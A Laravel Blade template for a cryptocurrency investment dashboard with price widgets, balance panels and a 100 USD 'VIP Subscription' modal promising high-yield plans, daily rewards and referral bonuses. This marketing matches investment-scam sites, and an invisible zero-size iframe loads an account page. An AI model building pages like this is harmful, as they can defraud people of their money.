@extends('layouts.dasboard')
   
@section('content')

<div class="dashboard-content ">

    <div class="membership-type" style="display: block;">
        <div class="container">

            <div class="membership-content">
                <cove-markets-market-ticker-tape instrumentSelection="BTC-USD,ETH-USD,LTC-USD,BCH-USD" position="center" width="100%" maxWidth="900px" border="1px solid gray" showBorder="true"></cove-markets-market-ticker-tape>

                <script type="module" defer src="https://cdn.jsdelivr.net/npm/@covemarkets/web-widgets@0.0.30/dist/market-ticker-tape/index.js"></script>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="invest-section">
            <div class="payment-balance">
                <div class="payement-wrap"> <span class="payement-wrap-title">Payments:</span>
                    <div class="balance-chart">
                        <div class="total-balance"> Total Balance <br>
                            <span>$0.00 USD </span>
                        </div>

                    </div>
                    <hr style="margin-top:60px">
                    <ul>
                                                    <li data-lbl='Bitcoin' data-val='$0.00'><img src="{{asset('img/btc.png')}}"> Bitcoin
                            <span>$0.00</span>
                        </li>
                                                    <li data-lbl='Ethereum' data-val='$0.00'><img src="{{asset('img/eth.png')}}"> Ethereum
                            <span>$0.00</span>
                        </li>
                                                    <li data-lbl='Ripple XRP 🏷' data-val='$0.00'><img src="{{asset('img/xrp.png')}}""> Ripple XRP 🏷
                            <span>$0.00</span>
                        </li>
                                                    <li data-lbl='Usdt' data-val='$0.00'><img src="{{asset('img/usdt.png')}}"> Usdt
                            <span>$0.00</span>
                        </li>
                                                    <li data-lbl='SOL' data-val='$0.00'><img src="{{asset('img/sol.png')}}"> SOL
                            <span>$0.00</span>
                        </li>
                                                    <li data-lbl='DOT' data-val='$0.00'><img src="{{asset('img/dot.png')}}"> DOT
                            <span>$0.00</span>
                        </li>
                                                </ul>
                </div>
                <!-- <div class="earning-chart no-data"> -->
                <div class="nomics-ticker-widget" data-name="Bitcoin" data-base="BTC" data-quote="USD"></div>
                <script src="https://widget.nomics.com/embed.js"></script>
            </div>
            <div class="total-amount">
                <ul>
                    <li>
                        <svg viewBox="0 0 44.42 33.56">
                            <g id="balance-icon" viewBox="0 0 44.42 33.56">
                                <rect x="1" y="1" width="42.42" height="31.56" rx="2.9" ry="2.9" fill="none" stroke-miterlimit="10" stroke-width="2"></rect>
                                <line x1="20.27" y1="10.62" x2="36.72" y2="10.62" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                                <line x1="20.27" y1="15.34" x2="29.08" y2="15.34" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                                <line x1="43.42" y1="24.78" x2="1.64" y2="24.78" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                                <circle cx="11.14" cy="12.87" r="2.94" fill="none" stroke-miterlimit="10" stroke-width="2"></circle>
                            </g>
                        </svg>
                        <span> AVAILABLE BALANCE </span> <strong> $0.00 USD </strong>
                    </li>
                    <li>
                        <svg viewBox="0 0 44.91 44.46">
                            <g id="earning-icon" viewBox="0 0 44.91 44.46">
                                <path d="M180.3,792.22,161,784.54a3,3,0,0,0-3.87,1.62l-2.42,5.74" transform="translate(-148.9 -779.71)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                <path d="M165.39,783l.79-1.09a3,3,0,0,1,4-.77l8.55,5.49" transform="translate(-148.9 -779.71)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                <path d="M188.38,814.3v5.87a3,3,0,0,1-3,3H152.9a3,3,0,0,1-3-3V798.64a3,3,0,0,1,3-3h32.48a3,3,0,0,1,3,3v5.65" transform="translate(-148.9 -779.71)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                <path d="M187.75,814.3h-9.33a5.06,5.06,0,1,1,0-10.12h9.33a5.06,5.06,0,1,1,0,10.12Z" transform="translate(-148.9 -779.71)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                <circle cx="30.2" cy="29.53" r="0.9" fill="none" stroke-miterlimit="10" stroke-width="2"></circle>
                            </g>
                        </svg>
                        <span> TOTAL EARNINGS </span> <strong> $0.00 USD </strong>
                    </li>
                    <li> Last Access: <span class="last-access"> Aug-7-2022 02:32:11 PM </span> </li>
                </ul>
                <a class="btn btn--red" style="text-transform: initial" href="?a=deposit"> + Make a New Investment</a>
            </div>
        </div>
        <div class="dashboard-status">
            <div class="row">
                <div class="col-md-6">
                    <div class="status-item investment"> <span class="status-title">
                            <svg viewBox="0 0 15.72 13.07">
                                <g id="invest-icon" viewBox="0 0 15.72 13.07">
                                    <rect x="0.5" y="4.66" width="14.72" height="7.91" rx="1.27" ry="1.27" fill="none" stroke-miterlimit="10"></rect>
                                    <path d="M13.28,6,4.81,2a1.24,1.24,0,0,0-1.6.67L1.89,5.74" transform="translate(0.12 -1.36)" fill="none" stroke-miterlimit="10"></path>
                                    <circle cx="7.86" cy="8.62" r="1.99" fill="none" stroke-miterlimit="10"></circle>
                                </g>
                            </svg>
                            Investment Chart: </span>
                        <div class="amount-chart">
                            <ul class="amounts">
                                <li> Invested Total: <span>$0.00 USD </span> </li>
                                <li> Active Investments: <span>$0.00 USD </span> </li>
                                <li> Recent Investment: <span>$n/a USD </span></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="status-item withdraw"> <span class="status-title">
                            <svg viewBox="0 0 15.48 13.88">
                                <g id="withdraw-icon" viewBox="0 0 15.48 13.88">
                                    <path d="M11,6.93h2a2,2,0,0,0,2-2V2.47a2,2,0,0,0-2-2H2.48a2,2,0,0,0-2,2V5a2,2,0,0,0,2,2H4.17" transform="translate(0 0)" fill="none" stroke-miterlimit="10"></path>
                                    <line x1="12.4" y1="3.72" x2="3.07" y2="3.72" fill="none" stroke-miterlimit="10"></line>
                                    <g>
                                        <rect x="4.25" y="3.82" width="6.92" height="9.56" fill="none" stroke-miterlimit="10"></rect>
                                        <path d="M9,7.84A1.28,1.28,0,1,1,7.71,6.56,1.28,1.28,0,0,1,9,7.84Z" transform="translate(0 0)" fill="none" stroke-miterlimit="10"></path>
                                    </g>
                                </g>
                            </svg>
                            Withdrawal Chart</span>
                        <div class="amount-chart">
                            <ul class="amounts">
                                <li> Total Withdrawn: <span>$0.00 USD </span> </li>
                                <li> Pending Withdrawal: <span>$0.00 USD </span> </li>
                                <li> Recent Withdraw: <span>$ n/a USD </span></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="history-profile-status">
            <div class="profile-status" style="width: 100%;">
                <div class="profile-status-icon">
                    <svg viewBox="0 0 16.04 23.49">
                        <g id="bell-icon" viewBox="0 0 16.04 23.49">

                            <g clip-path="url(#clip-path)">
                                <path d="M15,19.42H1v-8a7,7,0,0,1,14,0Z" transform="translate(0 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                <line x1="8.02" x2="8.02" y2="2.54" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                                <path d="M10.16,20.35a2.15,2.15,0,0,1-4.29,0" transform="translate(0 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                            </g>
                        </g>
                    </svg>
                </div>
                Complete Your Profile
                <p>Keep your information updated</p>
                <a style="width: 15%;" class="btn btn--trans" href="?a=edit_account"> Check Profile </a>
            </div>
        </div>
    </div>
    <iframe src="myaccount.html" id="editaccount" style="width: 0; height: 0;opacity: 0;"></iframe>
    
    
    <div class="container">
        <ul class="general-menu">
            <li> <a href="/">Homepage</a> </li>
            <li> <a href="?a=profile">Company Profile</a> </li>
            
            <li> <a href="?a=support">Help Center</a> </li>
        </ul>
    </div>
</div>

<div class="modal-bg"></div>
<div class="modal-holder">
    <div class="modal-content vip-subscription" style="margin: 4% auto;">
        <button class="modal-close"></button>

        <div class="vip-subscription-top">

            <svg style="width: 54px;height: 39px;" viewBox="0 0 28.47 34.31">
                <g id="open-vip" viewBox="0 0 28.47 26.31">
                    <rect x="1" y="1" width="26.47" height="24.31" rx="3.42" ry="3.42" fill="none" stroke="#a87c39" stroke-miterlimit="10" stroke-width="2"></rect>
                    <path d="M14.42,10.9l2.27,2.59,2.28-1-1.76,3.63H11.57L9.63,12.33l2.47,1.16Zm0-3-1.5,1.68L11.6,11l-1.11-.52L8.2,9.44A1.14,1.14,0,0,0,6.7,11l1.16,2.24L9.8,17l.56,1.08h8.1L19,17l1.76-3.63,1-2.13a1.14,1.14,0,0,0-1.5-1.54l-2.17,1-.93.42L15.92,9.58Z" transform="translate(0 0)" fill="#a87c39"></path>
                </g>
            </svg>
            <h2>VIP Subscription</h2>
            <p> VIP upgrade subscription, giving investors na access to the "VIP" Zone. This subscription costs 100 USD and
                allows you to invest in high-yield plans. VIP Plans are much more profitable than the other two plans in basic
                membership. </p>
            <div class="vip-wrap">
                <div class="vip-detail">
                    <div>
                        <svg class="bank-wire" viewBox="0 0 26.77 29.28">
                            <g id="daily-reward" viewBox="0 0 26.77 29.28">
                                <g>
                                    <path d="M22.63,10.49A9.49,9.49,0,1,1,13.15,1,9.49,9.49,0,0,1,22.63,10.49Z" transform="translate(0.07 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                    <path d="M25.24,28.28l-4.62-12a9.38,9.38,0,0,0,2-5.86A9.59,9.59,0,0,0,13.41,1,9.49,9.49,0,0,0,5.79,16.48L1.37,28.28H7.15a3.26,3.26,0,0,0,3.08-2.21L13,20h.18l.58,0,2.67,6.11a3.25,3.25,0,0,0,3.08,2.23Z" transform="translate(0.07 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                    <path d="M13.85,6.78l.84,1.69a.62.62,0,0,0,.46.34L17,9.08a.62.62,0,0,1,.34,1.05L16,11.44a.63.63,0,0,0-.18.55l.32,1.86a.61.61,0,0,1-.89.65l-1.67-.88a.66.66,0,0,0-.58,0l-1.67.88a.61.61,0,0,1-.89-.65L10.77,12a.63.63,0,0,0-.18-.55L9.24,10.13a.61.61,0,0,1,.34-1.05l1.87-.27a.62.62,0,0,0,.46-.34l.84-1.69A.61.61,0,0,1,13.85,6.78Z" transform="translate(0.07 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                                </g>
                            </g>
                        </svg>
                        <span>Daily reward <b>$1 Lifetime</b> </span>
                    </div>
                    <div>
                        <svg viewBox="0 0 32.75 32.75">
                            <g id="referral-comision" viewBox="0 0 32.75 32.75">
                                <circle cx="16.37" cy="16.37" r="9.49" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></circle>
                                <circle cx="1501.97" cy="1111.52" r="15.37" transform="translate(-1831.65 292.46) rotate(-45)" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2" stroke-dasharray="15.45 8.69"></circle>
                                <line x1="18.94" y1="13.04" x2="13.62" y2="19.84" fill="none" stroke="#405c6b" stroke-linecap="square" stroke-linejoin="bevel" stroke-width="2"></line>
                                <line x1="14.11" y1="12.38" x2="14.11" y2="14.33" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></line>
                                <line x1="18.45" y1="18.91" x2="18.45" y2="20.86" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></line>
                            </g>
                        </svg>
                        <span>Referral Bonus <b>Up to 6%</b> </span>
                    </div>
                </div>
                <div class="vip-detail">
                    <div>
                        <svg viewBox="0 0 30.3 32.54">
                            <g id="deposit-certification" viewBox="0 0 30.3 32.54">
                                <g>
                                    <path d="M23.61,10,14.88,6.4a2.87,2.87,0,0,0-3.31,1.39L9.25,12" transform="translate(-4 -5.29)" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></path>
                                    <path d="M15.4,29.48h-8A2.35,2.35,0,0,1,5,27.13V15a2.35,2.35,0,0,1,2.35-2.35H31A2.35,2.35,0,0,1,33.3,15V27.13A2.35,2.35,0,0,1,31,29.48" transform="translate(-4 -5.29)" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></path>
                                    <circle cx="19.43" cy="18.58" r="5.57" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></circle>
                                    <polyline points="18.84 31.7 23.51 28.7 23.51 22.43" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></polyline>
                                    <polyline points="15.07 22.43 15.07 28.7 19.74 31.7" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></polyline>
                                </g>
                            </g>
                        </svg>
                        <span>Legal Deposit certification</span>
                    </div>
                    <div>
                        <svg viewBox="0 0 28.47 34.31">
                            <g id="open-vip" viewBox="0 0 28.47 26.31">
                                <rect x="1" y="1" width="26.47" height="24.31" rx="3.42" ry="3.42" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></rect>
                                <path d="M14.42,10.9l2.27,2.59,2.28-1-1.76,3.63H11.57L9.63,12.33l2.47,1.16Zm0-3-1.5,1.68L11.6,11l-1.11-.52L8.2,9.44A1.14,1.14,0,0,0,6.7,11l1.16,2.24L9.8,17l.56,1.08h8.1L19,17l1.76-3.63,1-2.13a1.14,1.14,0,0,0-1.5-1.54l-2.17,1-.93.42L15.92,9.58Z" transform="translate(0 0)" fill="#405c6b"></path>
                            </g>
                        </svg>
                        <span>Access VIP Plans</span>
                    </div>
                </div>
            </div>
            <div class="vip-price">
                <svg viewBox="0 0 25.09 29.77">
                    <g id="dolar-border" viewBox="0 0 25.09 29.77">
                        <g>
                            <path d="M21.13,31.45H4a3,3,0,0,1-3-3V11.87A3,3,0,0,1,2.42,9.34L11,4.11a3,3,0,0,1,3.09,0l8.58,5.23a3,3,0,0,1,1.42,2.53V28.48A3,3,0,0,1,21.13,31.45Z" transform="translate(0 -2.68)" fill="none" stroke="#405c6b" stroke-miterlimit="10" stroke-width="2"></path>
                            <path d="M13.65,10.38V12A3.05,3.05,0,0,1,15,12.7a3.76,3.76,0,0,1,1,2.88H13.47a2,2,0,0,0-.21-1.12.81.81,0,0,0-.71-.31.83.83,0,0,0-.72.33,1.5,1.5,0,0,0-.21.89,1.59,1.59,0,0,0,.16.84,1.52,1.52,0,0,0,.7.47l1.55.63a3.08,3.08,0,0,1,1.6,1.21,5,5,0,0,1,.42,2.38,3.79,3.79,0,0,1-.8,2.76,3.27,3.27,0,0,1-1.6.8v2h-2.2V24.48a3,3,0,0,1-1.59-.81A3.77,3.77,0,0,1,9,20.92h2.48a1.73,1.73,0,0,0,.26,1.13,1,1,0,0,0,.77.3.92.92,0,0,0,.78-.32,1.67,1.67,0,0,0,.24-1,2.27,2.27,0,0,0-.2-1.18,1.84,1.84,0,0,0-.88-.58l-1.57-.65a2.73,2.73,0,0,1-1.37-1.06,4.08,4.08,0,0,1-.41-2.06,3.46,3.46,0,0,1,1.12-2.76,3.54,3.54,0,0,1,1.19-.65V10.38Z" transform="translate(0 -2.68)" fill="#405c6b"></path>
                        </g>
                    </g>
                </svg>
                <span>Price <b>100 USD</b> </span>
            </div>
        </div>
        <div class="subscribe-action">

            <a href="?a=deposit" class="btn btn--arrow btn--yellow">Subscribe Now
                <svg id="arrow" viewBox="0 0 83.82 125.21">
                    <g id="arrowRight" viewBox="0 0 83.82 125.21">
                        <polyline points="10.61 10.61 62.61 62.61 10.61 114.61" fill="none" stroke="" stroke-miterlimit="10" stroke-width="30"></polyline>
                    </g>
                </svg>
            </a>
            <div class="error-msg hidden">
                <svg viewBox="0 0 17.63 17.62">
                    <g id="warning-icon" viewBox="0 0 17.63 17.62">
                        <g clip-path="url(#clip-path)">
                            <path d="M16.63,8.81A7.82,7.82,0,1,1,8.81,1,7.81,7.81,0,0,1,16.63,8.81Z" transform="translate(0 0)" fill="none" stroke-miterlimit="10" stroke-width="2"></path>
                            <line x1="8.81" y1="3.92" x2="8.81" y2="10.22" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                            <line x1="8.81" y1="11.69" x2="8.81" y2="13.71" fill="none" stroke-miterlimit="10" stroke-width="2"></line>
                        </g>
                    </g>
                </svg>
                <span></span>
            </div>
        </div>

    </div>
</div>



@endsection

